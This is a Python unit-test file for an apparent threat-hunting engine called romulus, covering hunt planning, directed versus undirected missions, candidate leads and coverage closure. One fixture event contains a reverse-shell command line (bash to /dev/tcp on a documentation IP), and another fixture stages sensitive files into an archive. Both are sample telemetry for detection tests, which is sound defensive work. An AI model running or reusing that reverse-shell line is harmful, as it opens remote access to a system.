import tempfile
import unittest
from dataclasses import replace
from pathlib import Path
from types import SimpleNamespace
from unittest.mock import patch


def _engine(root: Path, *, use_ollama: bool = False):
    from romulus.config import Settings
    from romulus.investigation.workflow import HuntEngine
    from romulus.store import Store

    settings = replace(
        Settings.from_env(),
        home=root,
        data_dir=root / "data",
        logs_dir=root / "logs",
        reports_dir=root / "reports",
    )
    return HuntEngine(settings, Store(settings.data_dir, settings.logs_dir), offline=False, use_ollama=use_ollama)


def _planning_state(objective: str):
    return {
        "hunt_id": "HUNT-PLAN",
        "objective": objective,
        "hypotheses": [],
        "host": [],
        "network": [],
        "evidence": [],
        "coverage": {},
        "lead_catalog": [],
        "reasoning_history": [],
        "stage_history": [],
        "tool_runs": [],
        "source_errors": [],
        "tool_calls": 0,
        "started_epoch": 0,
    }


class MissionModeTests(unittest.TestCase):
    def test_hunt_state_contains_candidate_loop_fields(self):
        from romulus.investigation.workflow import HuntState

        for field in ("candidate_leads","search_tasks","search_queue","search_outcomes",
                "progress_baseline","progress_history","progress_totals","stagnant_cycles"):
            self.assertIn(field,HuntState.__annotations__)

    def test_hunt_initialization_preserves_or_baselines_progress_state(self):
        class App:
            def get_state(self,config): return SimpleNamespace(next=())
            def invoke(self,state,config): return state

        with tempfile.TemporaryDirectory(dir=Path.cwd()) as directory:
            root=Path(directory); engine=_engine(root)
            with patch.object(engine,"_graph",return_value=(App(),None)):
                created=engine.run("Hunt broadly",hunt_id="HUNT-NEW")
            self.assertEqual(created["progress_history"],[])
            self.assertEqual(created["progress_totals"]["cycles_recorded"],0)
            self.assertEqual(created["stagnant_cycles"],0)
            self.assertIn("evidence_ids",created["progress_baseline"])

            legacy={
                "hunt_id":"HUNT-LEGACY","objective":"Hunt broadly","status":"partial",
                "coverage":{},"lead_queue":[],"candidate_leads":[],"hypotheses":[],
                "host":[],"network":[],"investigation_graph":{},
                "progress_baseline":{"sentinel":["kept"]},
                "progress_history":[{"stage":"kept"}],"stagnant_cycles":2,
            }
            engine.store.save_state("HUNT-LEGACY",legacy)
            with patch.object(engine,"_graph",return_value=(App(),None)):
                resumed=engine.run("Hunt broadly",hunt_id="HUNT-LEGACY",_resume=True)
            self.assertEqual(resumed["progress_baseline"],{"sentinel":["kept"]})
            self.assertEqual(resumed["progress_history"],[{"stage":"kept"}])
            self.assertEqual(resumed["progress_totals"]["cycles_recorded"],1)
            self.assertEqual(resumed["stagnant_cycles"],2)

    def test_mission_mode_is_declared_in_graph_state_schema(self):
        from romulus.investigation.workflow import HuntState

        self.assertIn("mission_mode", HuntState.__annotations__)
        self.assertIn("pivot_results", HuntState.__annotations__)
        for field in ("search_tasks", "search_queue", "search_outcomes", "scheduler_history"):
            self.assertIn(field, HuntState.__annotations__)
        self.assertNotIn("dynamic_plan_created", HuntState.__annotations__)
        self.assertNotIn("dynamic_initial_queue", HuntState.__annotations__)

    def test_mission_classifier_distinguishes_direction_from_broad_discovery(self):
        from romulus.investigation.workflow import _mission_is_directed

        self.assertFalse(_mission_is_directed("Hunt for threats across all available telemetry"))
        self.assertFalse(_mission_is_directed("Find malicious actors on the mission partner network"))
        self.assertFalse(_mission_is_directed("Hunt across host and network telemetry"))
        self.assertFalse(_mission_is_directed("Hunt across host logs and user activity"))
        self.assertFalse(_mission_is_directed("The host is connected to the network"))
        self.assertFalse(_mission_is_directed("The host was connected to the network"))
        self.assertFalse(_mission_is_directed("Hunt across host endpoints and network devices"))
        self.assertFalse(_mission_is_directed(
            "Conduct an undirected threat hunt across available host and network telemetry "
            "from 2024-11-13T10:58:00-05:00 through 2024-11-13T11:10:00-05:00. "
            "Do not assume a technique; begin with deterministic discovery."
        ))
        self.assertTrue(_mission_is_directed("Hunt for SMB lateral movement"))
        self.assertTrue(_mission_is_directed("Investigate activity involving 10.20.30.40"))
        self.assertTrue(_mission_is_directed("Look for PowerShell encoded commands"))
        self.assertTrue(_mission_is_directed("Investigate host: srv-01"))
        self.assertTrue(_mission_is_directed("Investigate host webserver"))
        self.assertTrue(_mission_is_directed("Investigate user alice"))
        self.assertTrue(_mission_is_directed("Investigate account svcbackup"))
        self.assertTrue(_mission_is_directed("Investigate event ID 4624"))

    def test_broad_host_network_scope_never_calls_pretelemetry_model(self):
        with tempfile.TemporaryDirectory(dir=Path.cwd()) as directory:
            engine = _engine(Path(directory), use_ollama=True)
            engine._call = lambda *args, **kwargs: self.fail("broad host/network scope called a model")
            objective = (
                "Conduct an undirected threat hunt across available host and network telemetry "
                "from 2024-11-13T10:58:00-05:00 through 2024-11-13T11:10:00-05:00. "
                "Do not assume a technique; begin with deterministic discovery."
            )

            result = engine._plan(_planning_state(objective))

            self.assertEqual(result["mission_mode"], "undirected")
            self.assertEqual(result["hypotheses"], [])
            self.assertEqual(result["reasoning_history"][0]["basis"], "deterministic_telemetry_discovery")

    def test_undirected_plan_creates_no_hypothesis_or_model_call(self):
        with tempfile.TemporaryDirectory(dir=Path.cwd()) as directory:
            engine = _engine(Path(directory), use_ollama=True)
            engine._call = lambda *args, **kwargs: self.fail("undirected pre-telemetry planning called a model")

            result = engine._plan(_planning_state("Hunt for threats across all available telemetry"))

            self.assertEqual(result["mission_mode"], "undirected")
            self.assertEqual(result["hypotheses"], [])
            self.assertEqual(result["lead_catalog"], [])
            self.assertEqual(result["reasoning_history"][0]["basis"], "deterministic_telemetry_discovery")

    def test_undirected_reasoning_does_not_call_model_without_a_candidate(self):
        import time

        with tempfile.TemporaryDirectory(dir=Path.cwd()) as directory:
            engine = _engine(Path(directory), use_ollama=True)
            engine._call = lambda *args, **kwargs: self.fail("candidate-free undirected reasoning called a model")
            state = _planning_state("Hunt for threats across all telemetry")
            state.update({
                "mission_mode": "undirected",
                "candidate_leads": [],
                "search_artifacts": [],
                "search_fingerprints": [],
                "completed_leads": [],
                "lead_queue": [],
                "depth": 0,
                "started_epoch": time.time(),
                "coverage": {"search_fields": {"elasticsearch": ["process.name"]}},
            })

            result = engine._reason(state)

            self.assertEqual(result["hypotheses"], [])
            self.assertNotIn("termination_reason",result)
            self.assertEqual(engine._after_reason(result),"report")
            self.assertEqual(result["termination_reason"],"no_productive_frontier")

    def test_undirected_candidate_free_reasoning_makes_no_investigator_or_critic_call(self):
        import time

        with tempfile.TemporaryDirectory(dir=Path.cwd()) as directory:
            engine = _engine(Path(directory), use_ollama=True)
            engine._call = lambda *args, **kwargs: self.fail(
                "candidate-free undirected reasoning started an investigator or critic call"
            )
            state = _planning_state("Hunt broadly across all available telemetry")
            state.update({
                "mission_mode": "undirected",
                "candidate_leads": [],
                "search_artifacts": [],
                "completed_leads": [],
                "lead_catalog": [],
                "reasoning_history": [],
                "stage_history": [],
                "depth": 0,
                "started_epoch": time.time(),
                "coverage": {"search_fields": {"elasticsearch": ["process.name"]}},
            })

            result = engine._reason(state)

            self.assertEqual(result["hypotheses"], [])
            self.assertEqual(result["tool_calls"], 0)
            self.assertFalse(result["coverage"].get("reasoning_summary", {}).get("investigator_calls", 0))

    def test_undirected_hunt_without_candidate_still_never_reasons(self):
        import time

        with tempfile.TemporaryDirectory(dir=Path.cwd()) as directory:
            engine=_engine(Path(directory),use_ollama=True)
            engine._call=lambda *args,**kwargs: self.fail("candidate-free undirected hunt called a model")
            state=_planning_state("Hunt for threats across all telemetry")
            state.update({"mission_mode":"undirected","candidate_leads":[],"search_tasks":{},
                "search_queue":[],"search_outcomes":[],"scheduler_history":[],"stagnant_cycles":0,
                "depth":0,"started_epoch":time.time()})
            action=engine._after_analyze(state)
            self.assertEqual(action,"report")
            self.assertEqual(state["termination_reason"],"no_productive_frontier")

    def test_missing_mission_mode_defaults_to_undirected_for_generic_objective(self):
        with tempfile.TemporaryDirectory(dir=Path.cwd()) as directory:
            engine = _engine(Path(directory), use_ollama=True)
            engine._call = lambda *args, **kwargs: self.fail("legacy generic state called a model")
            state = _planning_state("Hunt for threats across all telemetry")
            state.update({
                "candidate_leads": [],
                "search_artifacts": [],
                "search_fingerprints": [],
                "completed_leads": [],
                "lead_queue": [],
                "depth": 0,
                "es_indices": ["host-events"],
                "es_fields": ["process.name"],
                "es_fields_by_class": {"host": ["process.name"]},
                "coverage": {},
            })

            engine._ensure_initial_plan(state)
            result = engine._reason(state)

            self.assertEqual(result["mission_mode"], "undirected")
            self.assertEqual(result["hypotheses"], [])
            self.assertIn("deferred", result["coverage"]["model_initial_search_plan"])

    def test_offline_undirected_plan_waits_for_a_deterministic_candidate(self):
        from romulus.config import Settings
        from romulus.investigation.workflow import HuntEngine
        from romulus.store import Store

        with tempfile.TemporaryDirectory(dir=Path.cwd()) as directory:
            root = Path(directory)
            settings = replace(Settings.from_env(), home=root, data_dir=root / "data",
                logs_dir=root / "logs", reports_dir=root / "reports")
            engine = HuntEngine(settings, Store(settings.data_dir, settings.logs_dir), offline=True)

            result = engine._plan(_planning_state("Hunt for threats across all available telemetry"))

            self.assertEqual(result["mission_mode"], "undirected")
            self.assertEqual(result["hypotheses"], [])
            self.assertEqual(result["lead_catalog"], [])

    def test_graph_preserves_undirected_guard_across_nodes(self):
        try:
            import langgraph  # noqa: F401
        except ImportError:
            self.skipTest("Install requirements.txt for the LangGraph state-boundary check")
        from dataclasses import replace
        from romulus.config import Settings
        from romulus.investigation.workflow import HuntEngine
        from romulus.store import Store

        with tempfile.TemporaryDirectory(dir=Path.cwd()) as directory:
            root = Path(directory)
            settings = replace(
                Settings.from_env(), home=root, data_dir=root / "data", logs_dir=root / "logs", reports_dir=root / "reports",
                max_tool_calls=30, max_depth=1, min_reasoning_rounds=1, max_runtime_seconds=30,
                arkime_username="", arkime_password="", pcap_files=(),
            )
            engine = HuntEngine(settings, Store(settings.data_dir, settings.logs_dir), offline=False, use_ollama=True)
            engine.es.indices = lambda: [{"index": "host-events"}]
            engine.es.mappings_many = lambda names: {"host-events": {"mappings": {"properties": {
                "@timestamp": {"type": "date"},
                "host": {"properties": {"name": {"type": "keyword"}}},
                "process": {"properties": {"name": {"type": "keyword"}}},
            }}}}
            engine.es.search_many = lambda indices, query, size: {
                "hits": [], "total": 0, "capped": False, "timed_out": False, "shard_failures": 0,
            }
            model_stages = []
            real_call = engine._call

            def guarded_call(state, tool, stage, parameters, time_range, fn, count):
                if tool == "ollama.api.chat":
                    model_stages.append(stage)
                    return None
                return real_call(state, tool, stage, parameters, time_range, fn, count)

            engine._call = guarded_call
            result = engine.run("Hunt for threats across all available telemetry")

            self.assertEqual(result["mission_mode"], "undirected")
            self.assertEqual(model_stages, [])
            self.assertEqual(result["hypotheses"], [])

    def test_directed_plan_labels_operator_direction_basis(self):
        with tempfile.TemporaryDirectory(dir=Path.cwd()) as directory:
            engine = _engine(Path(directory))

            result = engine._plan(_planning_state("Hunt for SMB lateral movement"))

            self.assertEqual(result["mission_mode"], "directed")
            self.assertTrue(result["hypotheses"])
            self.assertTrue(all(item["basis"] == "operator_direction" for item in result["hypotheses"]))


class CandidateHypothesisTests(unittest.TestCase):
    def test_observed_candidate_creates_only_candidate_backed_hypothesis(self):
        event = {
            "evidence_id": "EV-CHAIN",
            "source": "elasticsearch",
            "observed_at": "2026-10-12T12:00:00Z",
            "asset": "srv-01",
            "observation": "process execution",
            "raw": {
                "host": {"name": "srv-01"},
                "process": {
                    "executable": "/tmp/.cache/x",
                    "command_line": "bash -i >& /dev/tcp/198.51.100.7/443 0>&1",
                },
            },
        }
        with tempfile.TemporaryDirectory(dir=Path.cwd()) as directory:
            engine = _engine(Path(directory))
            state = _planning_state("Hunt for threats across all available telemetry")
            state.update({
                "mission_mode": "undirected",
                "host": [event],
                "findings": [],
                "completed_leads": [],
                "pivot_results": [],
                "queries": [],
                "candidate_leads": [],
            })

            result = engine._analyze(state)

            candidate_ids = {item["candidate_id"] for item in result["candidate_leads"]}
            self.assertTrue(result["hypotheses"])
            self.assertTrue(all(item.get("basis") == "observed_candidate" for item in result["hypotheses"]))
            self.assertTrue(all(set(item.get("basis_candidate_ids", [])) <= candidate_ids for item in result["hypotheses"]))
            self.assertTrue(all(item.get("basis_evidence_ids") for item in result["hypotheses"]))
            self.assertTrue(all(item.get("candidate_id") for item in result["lead_catalog"]))

    def test_candidate_leads_preserve_the_observed_scope_and_follow_up_intent(self):
        from romulus.investigation.workflow import _candidate_hypotheses, _lead_catalog, _lead_host_query

        candidate = {
            "candidate_id": "CL-SCOPED",
            "kind": "behavior",
            "title": "Remote service followed by execution",
            "description": "Observed cross-source sequence",
            "priority_score": 88,
            "assets": ["10.0.0.20"],
            "evidence_ids": ["EV-NET", "EV-HOST"],
            "attack_techniques": ["T1021"],
            "benign_explanations": ["Authorized administration"],
            "follow_ups": [{"follow_up_id": "FU-SCOPED", "intent": "Validate the cited remote-service sequence.",
                "status": "pending", "history": []}],
        }

        hypotheses = _candidate_hypotheses([candidate], [])
        leads = _lead_catalog(hypotheses)

        self.assertTrue(leads)
        self.assertTrue(all(lead["anchor_evidence_ids"] == ["EV-NET", "EV-HOST"] for lead in leads))
        self.assertTrue(all(lead["ips"] == ["10.0.0.20"] for lead in leads))
        self.assertTrue(all(lead["intent"] == "Validate the cited remote-service sequence." for lead in leads))

        unmapped = {**leads[0], "technique_id": "unmapped"}
        query = _lead_host_query(unmapped, ["@timestamp", "host.ip", "source.ip"], "@timestamp",
            {"gte": "2026-10-12T11:45:00Z", "lte": "2026-10-12T12:15:00Z"}, {})
        filters = query["bool"]["filter"]
        self.assertTrue(any("host.ip" in str(item) and "10.0.0.20" in str(item) for item in filters))


class AggregateSignalTests(unittest.TestCase):
    def test_every_aggregate_catalog_analytic_has_a_reachable_signal(self):
        from romulus.intelligence.analytics import summarize_evidence
        from romulus.intelligence.behavior_catalog import build_candidate_queue, load_behavior_catalog

        host, network = _aggregate_fixture()
        catalog = load_behavior_catalog()
        summary = summarize_evidence(host, network, limit=50)
        expected_signals = {
            value
            for analytic in catalog["analytics"]
            if analytic["source"] == "aggregate"
            for predicate in analytic["match"].get("any", []) + analytic["match"].get("all", [])
            for value in predicate.get("values", [])
        }
        emitted_signals = {
            signal for signal, rows in summary.get("aggregate_signals", {}).items() if rows
        }
        self.assertEqual(expected_signals - emitted_signals, set())

        candidates = build_candidate_queue(host + network, catalog, {"indicators": []}, summary)
        aggregate_ids = {item["id"] for item in catalog["analytics"] if item["source"] == "aggregate"}
        matched_ids = {item.get("analytic_id") for item in candidates}
        self.assertEqual(aggregate_ids - matched_ids, set())

    def test_authentication_sequence_is_time_bounded_and_cites_failure_and_success(self):
        from romulus.intelligence.analytics import summarize_evidence

        fail = {"evidence_id": "EV-FAIL", "source": "elasticsearch", "observed_at": "2026-10-12T12:00:00Z",
            "asset": "srv", "raw": {"event": {"code": "4625"}, "user": {"name": "alice"}, "source": {"ip": "10.0.0.8"}}}
        near = {"evidence_id": "EV-NEAR", "source": "elasticsearch", "observed_at": "2026-10-12T12:10:00Z",
            "asset": "srv", "raw": {"event": {"code": "4624"}, "user": {"name": "alice"}, "source": {"ip": "10.0.0.8"}}}
        far = dict(near, evidence_id="EV-FAR", observed_at="2026-10-12T12:30:00Z")

        rows = summarize_evidence([fail, near], [])["aggregate_signals"]["auth_failures_then_success"]
        self.assertEqual(rows[0]["sample_evidence_ids"], ["EV-FAIL", "EV-NEAR"])
        self.assertEqual(summarize_evidence([fail, far], [])["aggregate_signals"]["auth_failures_then_success"], [])

    def test_common_execution_does_not_create_privileged_or_remote_service_sequence(self):
        from romulus.intelligence.analytics import summarize_evidence

        login = {"evidence_id": "EV-LOGIN", "source": "elasticsearch", "observed_at": "2026-10-12T12:00:00Z",
            "asset": "10.0.0.20", "raw": {"event": {"code": "4672"}, "user": {"name": "admin"}}}
        executions = [{"evidence_id": f"EV-EXEC-{index}", "source": "elasticsearch",
            "observed_at": f"2026-10-12T12:0{index + 1}:00Z", "asset": "10.0.0.20",
            "raw": {"event": {"code": "4688"}, "user": {"name": "admin"}, "process": {"name": "common-agent"}}}
            for index in range(3)]
        network = [{"evidence_id": "EV-REMOTE", "source": "arkime", "observed_at": "2026-10-12T12:00:30Z",
            "asset": "10.0.0.20", "raw": {"source": {"ip": "10.0.0.10"},
                "destination": {"ip": "10.0.0.20", "port": 445}, "network": {"protocol": "smb"}}}]

        signals = summarize_evidence([login] + executions, network)["aggregate_signals"]
        self.assertEqual(signals["privileged_logon_then_execution"], [])
        self.assertEqual(signals["remote_service_then_execution"], [])

    def test_aggregate_candidate_preserves_all_supporting_evidence(self):
        from romulus.intelligence.analytics import summarize_evidence
        from romulus.intelligence.behavior_catalog import build_candidate_queue, load_behavior_catalog

        host, network = _aggregate_fixture()
        candidates = build_candidate_queue(host + network, load_behavior_catalog(), {"indicators": []},
            summarize_evidence(host, network, limit=50))
        remote = next(item for item in candidates if item.get("analytic_id") == "BH-AUTH-004")

        self.assertIn("EV-REMOTE", remote["evidence_ids"])
        self.assertIn("EV-EXEC", remote["evidence_ids"])


class CandidateStateTests(unittest.TestCase):
    def test_candidate_merge_preserves_disposition_follow_up_status_and_history(self):
        from romulus.intelligence.behavior_catalog import (
            build_candidate_queue,
            load_behavior_catalog,
            merge_candidate_queue,
        )

        event = {
            "evidence_id": "EV-STATE",
            "source": "elasticsearch",
            "observed_at": "2026-10-12T12:00:00Z",
            "asset": "srv-01",
            "observation": "process execution",
            "raw": {"host": {"name": "srv-01"}, "process": {"executable": "/tmp/tool"}},
        }
        catalog = load_behavior_catalog()
        prior = build_candidate_queue([event], catalog, {"indicators": []})
        target = next(item for item in prior if item["analytic_id"] == "BH-XPLAT-001")
        target["disposition"] = "investigating"
        target["follow_ups"][0]["status"] = "completed"
        target["follow_ups"][0]["history"].append({"search_id": "C-1", "status": "completed"})

        refreshed = build_candidate_queue([event], catalog, {"indicators": []})
        merged = merge_candidate_queue(prior, refreshed)
        current = next(item for item in merged if item["candidate_id"] == target["candidate_id"])

        self.assertEqual(current["disposition"], "investigating")
        self.assertEqual(current["follow_ups"][0]["status"], "completed")
        self.assertEqual(current["follow_ups"][0]["history"][0]["search_id"], "C-1")

    def test_candidate_merge_keeps_prior_only_candidates_and_follow_ups(self):
        from romulus.intelligence.behavior_catalog import merge_candidate_queue

        prior = [{"candidate_id": "CL-OLD", "kind": "behavior", "priority_score": 70,
            "disposition": "investigating", "evidence_ids": ["EV-OLD"],
            "follow_ups": [
                {"follow_up_id": "FU-STILL", "intent": "still relevant", "status": "pending", "history": []},
                {"follow_up_id": "FU-EXTRA", "intent": "added during investigation", "status": "completed",
                    "history": [{"search_id": "C-OLD", "status": "completed"}]},
            ]}]
        refreshed = [{"candidate_id": "CL-NEW", "kind": "behavior", "priority_score": 40,
            "disposition": "observed", "evidence_ids": ["EV-NEW"], "follow_ups": []}]

        merged = merge_candidate_queue(prior, refreshed)

        self.assertEqual({item["candidate_id"] for item in merged}, {"CL-OLD", "CL-NEW"})
        old = next(item for item in merged if item["candidate_id"] == "CL-OLD")
        self.assertEqual({item["follow_up_id"] for item in old["follow_ups"]}, {"FU-STILL", "FU-EXTRA"})

    def test_candidate_aware_closure_rejects_open_high_priority_lead(self):
        from romulus.intelligence.analytics import build_coverage_ledger

        candidate = {
            "candidate_id": "CL-OPEN",
            "priority_tier": "high",
            "disposition": "investigating",
            "finding_ids": [],
            "follow_ups": [{"follow_up_id": "FU-1", "intent": "Check context", "status": "pending", "history": []}],
        }
        tasks = {"ST-CANDIDATE": {"task_id": "ST-CANDIDATE", "candidate_ids": ["CL-OPEN"],
            "follow_up_ids": ["FU-1"], "source_family": "host"}}
        open_ledger = build_coverage_ledger([], tasks, [], True, True, [candidate])
        self.assertFalse(open_ledger["closure_ready"])
        self.assertEqual(open_ledger["open_candidate_ids"], ["CL-OPEN"])

        candidate["disposition"] = "corroborated"
        candidate["finding_ids"] = ["F-1"]
        candidate["follow_ups"][0]["status"] = "completed"
        closed_ledger = build_coverage_ledger([], tasks, [
            {"task_id": "ST-CANDIDATE", "status": "completed", "returned_total": 0,
             "matched_total": 0, "capped": False, "timed_out": False, "shard_failures": 0}
        ], True, True, [candidate])
        self.assertTrue(closed_ledger["closure_ready"])

    def test_hypothesis_closure_requires_every_planned_analytic_and_an_assessment(self):
        from romulus.intelligence.analytics import build_coverage_ledger

        hypothesis = {"hypothesis_id": "H-1", "priority": 5, "expected_host": ["host"],
            "expected_network": ["network"], "model_assessment": {"status": "supported", "evidence_ids": ["EV-1"]}}
        tasks = {
            "ST-HOST": {"task_id": "ST-HOST", "hypothesis_ids": ["H-1"], "source_family": "host"},
            "ST-NET": {"task_id": "ST-NET", "hypothesis_ids": ["H-1"], "source_family": "network"},
        }
        partial = build_coverage_ledger(
            [hypothesis], tasks,
            [{"task_id": "ST-HOST", "status": "completed", "returned_total": 1,
              "matched_total": 1, "capped": False, "timed_out": False, "shard_failures": 0}],
            True, True,
        )
        self.assertFalse(partial["hypothesis_closure_ready"])

        complete = build_coverage_ledger(
            [hypothesis], tasks,
            [
                {"task_id": "ST-HOST", "status": "completed", "returned_total": 1,
                 "matched_total": 1, "capped": False, "timed_out": False, "shard_failures": 0},
                {"task_id": "ST-NET", "status": "completed", "returned_total": 0,
                 "matched_total": 0, "capped": False, "timed_out": False, "shard_failures": 0},
            ],
            True, True,
        )
        self.assertTrue(complete["hypothesis_closure_ready"])

        short = build_coverage_ledger(
            [hypothesis], tasks,
            [
                {"task_id": "ST-HOST", "status": "completed", "returned_total": 1,
                 "matched_total": 1, "capped": False, "timed_out": False, "shard_failures": 0},
                {"task_id": "ST-NET", "status": "completed", "returned_total": 0,
                 "matched_total": 1, "capped": False, "timed_out": False, "shard_failures": 0},
            ],
            True, True,
        )
        self.assertFalse(short["hypothesis_closure_ready"])

        failed = build_coverage_ledger(
            [hypothesis], tasks,
            [
                {"task_id": "ST-HOST", "status": "completed", "returned_total": 1,
                 "matched_total": 1, "capped": False, "timed_out": False, "shard_failures": 0},
                {"task_id": "ST-NET", "status": "failed", "returned_total": 0,
                 "matched_total": None, "capped": False, "timed_out": False, "shard_failures": 0},
            ],
            True, True,
        )
        self.assertFalse(failed["hypothesis_closure_ready"])

        capped = build_coverage_ledger(
            [hypothesis], tasks,
            [
                {"task_id": "ST-HOST", "status": "completed", "returned_total": 1,
                 "matched_total": 1, "capped": False, "timed_out": False, "shard_failures": 0},
                {"task_id": "ST-NET", "status": "partial", "returned_total": 5,
                 "matched_total": 10, "capped": True, "timed_out": False, "shard_failures": 0},
            ],
            True, True,
        )
        self.assertFalse(capped["hypothesis_closure_ready"])

    def test_explicit_unavailable_source_gap_is_closed_but_remains_visible(self):
        from romulus.intelligence.analytics import build_coverage_ledger

        hypothesis = {"hypothesis_id": "H-NETWORK-GAP", "priority": 5,
            "expected_host": [], "expected_network": ["network sessions"]}
        candidate = {"candidate_id": "CL-NETWORK-GAP", "kind": "behavior",
            "priority_tier": "critical", "disposition": "corroborated", "finding_ids": ["F-1"],
            "telemetry_gaps": ["network telemetry unavailable"],
            "follow_ups": [{"follow_up_id": "FU-NETWORK-GAP", "status": "skipped_due_gap",
                "history": [{"status": "skipped_due_gap", "reason": "network telemetry unavailable"}]}]}

        ledger = build_coverage_ledger([hypothesis], {}, [], True, False, [candidate])

        self.assertTrue(ledger["hypothesis_closure_ready"])
        self.assertTrue(ledger["candidate_closure_ready"])
        self.assertEqual(ledger["rows"][0]["telemetry_gaps"], ["network telemetry unavailable"])

    def test_model_hypothesis_creation_is_disabled_after_candidate_instantiation(self):
        with tempfile.TemporaryDirectory(dir=Path.cwd()) as directory:
            engine=_engine(Path(directory))
            self.assertFalse(hasattr(engine,"_append_model_hypotheses"))


def _aggregate_fixture():
    def host_event(identifier, minute, asset, **raw):
        return {
            "evidence_id": identifier,
            "source": "elasticsearch",
            "observed_at": f"2026-10-12T12:{minute:02d}:00Z",
            "asset": asset,
            "observation": "host event",
            "raw": raw,
        }

    def network_event(identifier, minute, src, dst, port, protocol="tcp", byte_count=800, **raw):
        body = {
            "source": {"ip": src},
            "destination": {"ip": dst, "port": port},
            "network": {"protocol": protocol, "bytes": byte_count},
        }
        body.update(raw)
        return {
            "evidence_id": identifier,
            "source": "arkime",
            "observed_at": f"2026-10-12T12:{minute:02d}:00Z",
            "asset": dst,
            "observation": "network event",
            "raw": body,
        }

    host = [
        host_event("EV-FAIL", 0, "10.0.0.20", event={"code": "4625"}, user={"name": "admin"}, source={"ip": "10.0.0.10"}),
        host_event("EV-SUCCESS", 1, "10.0.0.20", event={"code": "4624"}, user={"name": "admin"}, source={"ip": "10.0.0.10"}),
        host_event("EV-PRIV", 2, "10.0.0.20", event={"code": "4672"}, user={"name": "admin"}),
        host_event("EV-EXEC", 3, "10.0.0.20", event={"code": "4688"}, user={"name": "admin"}, process={"name": "raretool", "command_line": "raretool --run"}),
        host_event("EV-STAGE", 10, "10.0.0.10", event={"code": "4688"}, process={"name": "7z", "command_line": "7z a archive.7z C:\\Sensitive"}),
    ]
    for index in range(4):
        host.append(host_event(
            f"EV-AUTH-{index}", 4 + index, f"10.0.0.{30 + index}",
            event={"code": "4624"}, user={"name": "operator"}, source={"ip": "10.0.0.9"},
        ))

    network = [
        network_event("EV-REMOTE", 2, "10.0.0.10", "10.0.0.20", 445, "smb"),
        network_event("EV-DNS-ENTROPY", 11, "10.0.0.10", "8.8.8.8", 53, "dns", dns={"question": {"name": "a9f3k2m8q7w4z6x1c5v0b2n8.example.com"}}),
        network_event("EV-MISMATCH", 12, "10.0.0.10", "8.8.4.4", 443, "dns"),
        network_event("EV-RARE", 13, "10.0.0.20", "93.184.216.34", 443, "https", 900),
        network_event("EV-TRANSFER", 15, "10.0.0.10", "1.1.1.1", 443, "https", 8_000_000),
    ]
    for index in range(5):
        network.append(network_event(
            f"EV-NX-{index}", 20 + index, "10.0.0.10", "8.8.8.8", 53, "dns",
            dns={"question": {"name": f"missing-{index}.example.com"}, "response_code": "NXDOMAIN"},
        ))
    for index in range(5):
        network.append(network_event(f"EV-FAN-{index}", 30 + index, "10.0.0.50", f"10.0.1.{index + 1}", 445, "smb"))
    for index, minute in enumerate((40, 44, 48, 52)):
        network.append(network_event(f"EV-PER-{index}", minute, "10.0.0.60", "203.0.113.20", 443, "tls"))
    return host, network


if __name__ == "__main__":
    unittest.main()
